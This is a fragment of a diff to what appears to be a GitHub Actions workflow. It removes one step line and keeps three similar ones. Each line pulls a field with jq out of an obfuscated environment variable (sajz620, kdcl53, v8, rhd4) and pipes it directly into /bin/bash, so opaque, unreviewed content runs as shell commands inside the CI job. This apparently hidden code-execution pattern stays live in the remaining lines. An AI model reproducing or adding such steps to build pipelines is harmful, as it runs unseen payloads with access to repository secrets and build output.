@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$sajz620" | jq -r .ptl774 | /bin/bash
           echo $kdcl53 | jq -r .sad802 | /bin/bash
           echo $v8 | jq -r .crop39470 | /bin/bash
-          printf '%s' "$rhd4" | jq -r .ai021 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
